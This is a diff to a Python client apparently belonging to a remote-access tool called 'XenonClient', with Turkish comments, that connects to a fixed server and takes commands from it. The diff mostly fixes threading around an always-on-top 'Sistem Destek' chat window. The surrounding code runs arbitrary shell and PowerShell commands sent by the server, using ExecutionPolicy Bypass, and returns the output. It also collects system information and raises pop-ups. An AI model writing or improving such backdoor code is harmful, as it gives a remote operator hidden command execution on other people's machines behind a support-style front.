@@ -22,6 +22,7 @@ class XenonClient:
         self.sock = None
         self.chat_win = None
         self.chat_box = None
+        self.chat_running = False
 
     def get_sys_info(self):
         return json.dumps({
@@ -62,19 +63,23 @@ class XenonClient:
                     threading.Thread(target=lambda: messagebox.showinfo("Duyuru", data.split("|")[1])).start()
 
                 elif data == "chat_open":
-                    if not self.chat_win:
-                        threading.Thread(target=self.gui_chat).start()
+                    if not self.chat_running:
+                        threading.Thread(target=self.gui_chat, daemon=True).start()
 
                 elif data.startswith("chat_msg|"):
                     if self.chat_box:
-                        self.chat_box.config(state="normal")
-                        self.chat_box.insert(tk.END, f"DESTEK: {data.split('|')[1]}\n")
-                        self.chat_box.config(state="disabled"); self.chat_box.see(tk.END)
+                        try:
+                            self.chat_box.config(state="normal")
+                            self.chat_box.insert(tk.END, f"DESTEK: {data.split('|')[1]}\n")
+                            self.chat_box.config(state="disabled"); self.chat_box.see(tk.END)
+                        except: pass
 
                 elif data == "chat_close":
                     if self.chat_win: 
-                        self.chat_win.after(0, self.chat_win.destroy)
-                        self.chat_win = None
+                        # Thread hatası almamak için pencereyi kendi döngüsünde kapat
+                        self.chat_running = False
+                        try: self.chat_win.quit() 
+                        except: pass
 
                 elif data == "beep":
                     if platform.system() == "Windows":
@@ -100,7 +105,6 @@ class XenonClient:
     def run_cmd(self, command_to_run, mode):
         def task():
             try:
-                # 'cmd' ismini kullanmıyoruz ki dışarıyla çakışmasın
                 final_cmd = command_to_run
                 if mode == "powershell":
                     final_cmd = f"powershell -ExecutionPolicy Bypass -Command {command_to_run}"
@@ -113,11 +117,14 @@ class XenonClient:
                 self.sock.send(f"shell_res|{res}".encode("utf-8"))
             except Exception as e:
                 self.sock.send(f"shell_res|Hata: {str(e)}".encode("utf-8"))
-        threading.Thread(target=task).start()
+        threading.Thread(target=task, daemon=True).start()
 
     def gui_chat(self):
-        if self.chat_win: return
-        self.chat_win = tk.Tk(); self.chat_win.title("Destek"); self.chat_win.geometry("350x450")
+        """Sohbet penceresi yönetim thread'i."""
+        self.chat_running = True
+        self.chat_win = tk.Tk()
+        self.chat_win.title("Sistem Destek")
+        self.chat_win.geometry("350x450")
         self.chat_win.attributes("-topmost", True)
         
         self.chat_box = scrolledtext.ScrolledText(self.chat_win, state="disabled")
@@ -138,12 +145,17 @@ class XenonClient:
         ent.bind("<Return>", send_srv)
         
         def on_closing():
+            self.chat_running = False
             self.chat_win.destroy()
             self.chat_win = None
             self.chat_box = None
             
         self.chat_win.protocol("WM_DELETE_WINDOW", on_closing)
+        
+        # mainloop'u güvenli şekilde çalıştır
         self.chat_win.mainloop()
+        self.chat_running = False
+        self.chat_win = None
 
 if __name__ == "__main__":
     XenonClient(HOST, PORT).connect()
